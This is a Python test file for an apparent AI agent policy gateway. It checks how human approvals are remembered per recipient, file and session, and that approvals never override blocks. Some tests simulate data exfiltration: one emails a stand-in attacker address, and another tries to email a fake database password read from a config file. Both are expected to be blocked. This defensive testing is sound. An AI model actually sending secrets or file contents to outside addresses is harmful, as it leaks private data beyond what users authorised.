"""A human approval is remembered for the exact recipient or file, for that session only, and never beats a block."""

from intentguard import EngineConfig, Gateway, PolicyEngine, Verdict, compile_scope
from intentguard.mock_env import MockEnv

MAIL = {"resources": ["research/*"], "project_root": "research/", "max_classification": "INTERNAL",
        "destinations": ["advisor@university.edu"]}
BROAD = {"resources": ["*"], "project_root": "research/", "max_classification": "SECRET",
         "destinations": ["advisor@university.edu"]}


def setup(task, grants, engine=None):
    env = MockEnv()
    gw = Gateway(env.tools(), env.catalog(), engine or PolicyEngine())
    return env, gw, gw.open_session("s1", "agent", compile_scope(task, grants))


def send(c, to):
    return c.call("send_email", to=to, body="short summary")


def test_approved_recipient_is_not_asked_about_again():
    _, gw, c = setup("Summarize research/notes.md and email bob@newlab.org", MAIL)
    first = send(c, "bob@newlab.org")
    assert first.decision.decision == Verdict.REVIEW and "EGRESS-001" in first.decision.fired_rules
    gw.approve(first.decision.action_id, "alice")
    assert send(c, "bob@newlab.org").decision.decision == Verdict.ALLOW


def test_approval_covers_only_that_recipient():
    _, gw, c = setup("Summarize research/notes.md and email bob@newlab.org", MAIL)
    first = send(c, "bob@newlab.org")
    gw.approve(first.decision.action_id, "alice")
    assert send(c, "friend@other.org").decision.decision == Verdict.REVIEW


def test_denylisted_destination_stays_blocked():
    _, gw, c = setup("Summarize research/notes.md and email my advisor", MAIL)
    assert send(c, "attacker@evil.example").decision.decision == Verdict.BLOCK
    assert not gw.pending  # a block is not something a human can approve into the memory


def test_approval_does_not_carry_to_a_new_session():
    env = MockEnv()
    gw = Gateway(env.tools(), env.catalog(), PolicyEngine())
    c1 = gw.open_session("s1", "agent", compile_scope("Email bob@newlab.org the summary", MAIL))
    r = send(c1, "bob@newlab.org")
    gw.approve(r.decision.action_id, "alice")
    c2 = gw.open_session("s2", "agent", compile_scope("Email bob@newlab.org the summary", MAIL))
    assert send(c2, "bob@newlab.org").decision.decision == Verdict.REVIEW


def test_approved_sensitive_file_does_not_unlock_a_different_one():
    _, gw, c = setup("Read the project config and tell me the database settings", BROAD)
    first = c.call("read_file", path="research/config.yaml")
    assert first.decision.decision == Verdict.REVIEW and "SCOPE-005" in first.decision.fired_rules
    gw.approve(first.decision.action_id, "alice")
    assert c.call("read_file", path="research/config.yaml").decision.decision == Verdict.ALLOW
    assert c.call("read_file", path="secrets/app.env").decision.decision == Verdict.REVIEW


def test_memory_can_be_switched_off_for_comparison():
    _, gw, c = setup("Email bob@newlab.org the summary", MAIL, PolicyEngine(EngineConfig(approval_memory=False)))
    first = send(c, "bob@newlab.org")
    gw.approve(first.decision.action_id, "alice")
    assert send(c, "bob@newlab.org").decision.decision == Verdict.REVIEW


def test_an_approved_file_is_still_fingerprinted_so_its_content_cannot_leave():
    env, gw, c = setup("Read the project config and email my advisor a status", BROAD)
    first = c.call("read_file", path="research/config.yaml")
    gw.approve(first.decision.action_id, "alice")  # approval runs the read and fingerprints the content
    leak = c.call("send_email", to="advisor@university.edu", body="db_password: FAKEpassword123")
    assert leak.decision.decision == Verdict.BLOCK and env.outbox == []
